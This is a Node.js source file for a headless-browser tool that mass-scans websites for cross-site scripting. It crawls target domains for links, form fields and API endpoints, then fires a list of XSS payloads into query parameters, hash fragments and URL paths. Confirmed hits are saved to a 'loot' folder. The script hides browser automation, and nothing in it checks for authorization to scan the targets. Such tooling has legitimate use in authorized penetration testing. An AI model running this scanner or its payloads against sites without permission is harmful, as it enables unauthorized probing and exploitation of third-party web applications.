const puppeteer = require('puppeteer-core');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

// Strategic payload group targeting classic tags, structural breakouts, and SPA frameworks
const payloads = [
    'javascript:alert(1)',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"`><script>alert(1)</script>',
    '${alert(1)}',
    '{{constructor.constructor(\'alert(1)\')()}}'
];

// Ensure output directories exist for security findings
const reportDir = path.join(__dirname, 'loot');
if (!fs.existsSync(reportDir)) {
    fs.mkdirSync(reportDir);
}

// CLI Argument Parsing
const args = process.argv.slice(2);
if (args.length === 0) {
    console.log("❌ Error: Missing targets.");
    process.exit(1);
}

const inputTarget = args[0];
let targetList = [];

if (fs.existsSync(inputTarget)) {
    targetList = fs.readFileSync(inputTarget, 'utf-8')
        .split('\n')
        .map(line => line.trim())
        .filter(line => line.startsWith('http://') || line.startsWith('https://'));
} else if (inputTarget.startsWith('http://') || inputTarget.startsWith('https://')) {
    targetList.push(inputTarget);
} else {
    console.log("❌ Error: Input must be a valid HTTP/HTTPS URL or an existing text file.");
    process.exit(1);
}

function logVulnerability(issue) {
    const filename = path.join(reportDir, 'findings.json');
    let existingData = [];
    if (fs.existsSync(filename)) {
        try {
            existingData = JSON.parse(fs.readFileSync(filename, 'utf-8'));
        } catch (e) {
            existingData = [];
        }
    }
    existingData.push({ timestamp: new Date().toISOString(), ...issue });
    fs.writeFileSync(filename, JSON.stringify(existingData, null, 4), 'utf-8');
}

async function runMassScanner() {
    console.log(`[+] Initializing Chromium Browser via Puppeteer...`);
    const browser = await puppeteer.launch({ 
        executablePath: '/usr/bin/chromium-browser',
        headless: true,
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled'
        ]
    });

    for (let baseScope of targetList) {
        console.log(`\n==================================================================`);
        console.log(`🎯 STARTING ADVANCED DEEP SPIDER SCAN ON SCOPE: ${baseScope}`);
        console.log(`==================================================================`);

        const crawledEndpoints = new Set([baseScope]);
        const endpointsToFuzz = [];
        const targetDomain = new URL(baseScope).hostname;

        // === PHASE 1: AUTOMATED SPIDER & SPA NETWORK INTERCEPTION ===
        console.log(`[🔍 Phase 1]: Crawling domain to map all unique endpoints...`);
        const crawlPage = await browser.newPage();
        await crawlPage.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

                // [📡 SPA Network Interceptor]: Optimized to strictly follow in-scope targets
        crawlPage.on('request', request => {
            const requestUrl = request.url();
            const resourceType = request.resourceType();

            if (resourceType === 'xhr' || resourceType === 'fetch') {
                try {
                    const parsedApiUrl = new URL(requestUrl);
                    
                    // STRICT CHECK: The domain must EXACTLY match or be a subdomain of your target domain
                    if (parsedApiUrl.hostname === targetDomain || parsedApiUrl.hostname.endsWith('.' + targetDomain)) {
                        const cleanApiPath = parsedApiUrl.origin + parsedApiUrl.pathname;
                        
                        if (!crawledEndpoints.has(cleanApiPath)) {
                            crawledEndpoints.add(cleanApiPath);
                            console.log(`   [📡 SPA Endpoint Discovered]: ${cleanApiPath}`);
                        }
                    }
                } catch (e) {
                    // Suppress parsing errors on malformed API requests
                }
            }
        });


        try {
            console.log(`   [*] Indexing entry point: ${baseScope}`);
            await crawlPage.goto(baseScope, { waitUntil: 'domcontentloaded', timeout: 20000 });
            
            // Allow client-side routers a 3-second window to finish executing hidden network streams
            await new Promise(resolve => setTimeout(resolve, 3000));

            // Extract embedded static HTML structural attributes
            const discoveredInfo = await crawlPage.evaluate(() => {
                const links = [];
                const formsAndParams = [];

                document.querySelectorAll('a').forEach(el => {
                    const href = el.href;
                    if (href && href.startsWith('http')) {
                        links.push(href);
                    }
                });

                document.querySelectorAll('input, textarea, select, form').forEach(el => {
                    if (el.name) formsAndParams.push(el.name);
                    else if (el.id) formsAndParams.push(el.id);
                });

                return { links, formsAndParams };
            });

            // Filter static HTML link hrefs to match domain criteria
            discoveredInfo.links.forEach(link => {
                try {
                    const linkUrl = new URL(link);
                    if (linkUrl.hostname.includes(targetDomain)) {
                        crawledEndpoints.add(linkUrl.origin + linkUrl.pathname);
                    }
                } catch (e) {}
            });

            // Standard fallback parameter variables if page elements are completely empty
            const trackedParams = discoveredInfo.formsAndParams.length > 0 ? discoveredInfo.formsAndParams : ['search', 'q', 'id'];

            // Format all newly aggregated endpoints into modular execution models
            crawledEndpoints.forEach(endpoint => {
                endpointsToFuzz.push({ endpoint, parameters: trackedParams });
            });

            console.log(`[+] Deep Spider Phase Complete. Found ${crawledEndpoints.size} unique system endpoints.`);

        } catch (err) {
            console.log(`[-] Global crawler phase initialization failed. Defaulting to index fuzzing.`);
            endpointsToFuzz.push({ endpoint: baseScope, parameters: ['search', 'q', 'id'] });
        } finally {
            await crawlPage.close();
        }

        // === PHASE 2: ATTACK MATRIX FUZZING ===
        console.log(`[🚀 Phase 2]: Fuzzing attack permutations across crawled map...`);
        
        for (const scopeDetails of endpointsToFuzz) {
            const currentUrl = scopeDetails.endpoint;
            console.log(`\n[*] Fuzzing mapped directory: ${currentUrl}`);

            for (let payload of payloads) {
                const testUrls = [];

                // Vector A: Automated Query Combinations
                scopeDetails.parameters.forEach(param => {
                    testUrls.push({
                        url: currentUrl.includes('?') ? `${currentUrl}&${param}=${encodeURIComponent(payload)}` : `${currentUrl}?${param}=${encodeURIComponent(payload)}`,
                        type: `QUERY (${param})`
                    });
                });

                // Vector B: Hash Fragments
                testUrls.push({ url: `${currentUrl.replace(/\/$/, '')}#${encodeURIComponent(payload)}`, type: 'HASH (#)' });

                // Vector C: Clean Router Paths
                testUrls.push({ url: `${currentUrl.replace(/\/$/, '')}/${encodeURIComponent(payload)}`, type: 'PATH-ROUTER' });

                for (let target of testUrls) {
                    const attackPage = await browser.newPage();
                    await attackPage.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
                    let xssDetected = false;

                    attackPage.on('dialog', async dialog => {
                        if (dialog.message() || dialog.type() === 'alert') {
                            console.log(`\n🚨🚨🚨 [XSS DETECTED!] -> ${target.url}`);
                            logVulnerability({ target_scope: baseScope, exploit_url: target.url, payload: payload });
                            xssDetected = true;
                            await dialog.dismiss();
                        }
                    });

                    // API Interception within the attack window
                    attackPage.on('response', async response => {
                        try {
                            const contentType = response.headers()['content-type'] || '';
                            if (contentType.includes('application/json') || contentType.includes('text/html')) {
                                const body = await response.text();
                                if (body.includes(payload)) {
                                    console.log(`   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: ${response.url()}`);
                                    logVulnerability({ target_scope: baseScope, exploit_url: target.url, payload: payload, API_reflection: response.url() });
                                }
                            }
                        } catch (e) {}
                    });

                    try {
                        console.log(`   [→] Testing ${target.type}: ${target.url}`);
                        await attackPage.goto(target.url, { waitUntil: 'domcontentloaded', timeout: 25000 });
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    } catch (error) {
                        console.log(`   [-] Timeout handling vector invocation.`);
                    } finally {
                        await attackPage.close();
                    }
                }
            }
        }
    }
    await browser.close(); // Shuts down the browser engine safely
    console.log(`\n[+] Dynamic Master Scan Campaign Finished.`);
} // Closes the runMassScanner function

// This line executes the entire automation engine when you run "node xss_detectorabang7.js"
runMassScanner(); 
